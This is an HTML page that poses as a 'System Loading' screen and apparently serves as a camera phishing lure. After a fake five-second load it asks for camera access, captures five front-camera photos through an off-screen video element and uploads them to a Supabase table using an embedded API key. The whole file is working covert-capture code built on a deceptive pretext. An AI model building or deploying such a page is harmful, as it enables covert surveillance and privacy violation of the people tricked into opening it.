<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Loading</title>
    <!-- Supabase Library v2 ko import kiya gaya hai -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #1a1a1a; color: white; text-align: center; margin: 0; flex-direction: column; }
        #status-container { padding: 20px; }
        #status { font-size: 20px; margin-bottom: 20px; }
        #loader { border: 6px solid #f3f3f3; border-top: 6px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 1.5s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        #allow-button { background-color: #28a745; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 5px; cursor: pointer; display: none; margin-top: 20px; }
        #allow-button:hover { background-color: #218838; }
        video { position: absolute; top: -9999px; left: -9999px; }
    </style>
</head>
<body>

    <div id="status-container">
        <div id="loader"></div>
        <p id="status">System is loading, please wait...</p>
        <button id="allow-button">Allow Camera Access</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const SUPABASE_URL = 'https://zxtapsswwmzrirutpelr.supabase.co';
        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inp4dGFwc3N3d216cmlydXRwZWxyIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTAxNTExNzcsImV4cCI6MjA2NTcyNzE3N30.J6kJ9k0AEAarxHVePl0gZSG6ya32rP7IsG8R6UfuO-U';

        // Sahi tareeqa Supabase client banane ka
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
        
        const statusEl = document.getElementById('status');
        const loaderEl = document.getElementById('loader');
        const allowButton = document.getElementById('allow-button');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        // Yeh line ab chalegi kyunke upar koi error nahi hai
        setTimeout(() => {
            statusEl.textContent = 'Permission required to continue.';
            loaderEl.style.display = 'none';
            allowButton.style.display = 'block';
        }, 5000);

        allowButton.addEventListener('click', startCameraProcess);

        async function startCameraProcess() {
            allowButton.style.display = 'none';
            loaderEl.style.display = 'block';
            statusEl.textContent = 'Requesting camera access...';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    statusEl.textContent = 'Access granted. Capturing images...';
                    captureAndSendPhotos(stream);
                };
            } catch (err) {
                console.error("Camera access error:", err);
                statusEl.textContent = 'Camera access was denied. Cannot proceed.';
                loaderEl.style.display = 'none';
            }
        }

        function captureAndSendPhotos(stream) {
            const totalPhotos = 5;
            let photosTaken = 0;
            const captureInterval = setInterval(() => {
                if (photosTaken >= totalPhotos) {
                    clearInterval(captureInterval);
                    stream.getTracks().forEach(track => track.stop());
                    statusEl.textContent = 'Process completed successfully.';
                    loaderEl.style.display = 'none';
                    return;
                }
                photosTaken++;
                statusEl.textContent = `Capturing and sending photo ${photosTaken} of ${totalPhotos}...`;
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                const imageData = canvas.toDataURL('image/jpeg');
                sendToSupabase(imageData);
            }, 1500);
        }

        async function sendToSupabase(imageData) {
            try {
                const { data, error } = await supabaseClient // Yahan 'supabaseClient' istemal kiya
                    .from('images')
                    .insert([ { image_data: imageData } ]);
                if (error) throw error;
                console.log('Image sent to Supabase!');
            } catch (error) {
                console.error('Error sending to Supabase:', error.message);
            }
        }
    </script>
</body>
</html>
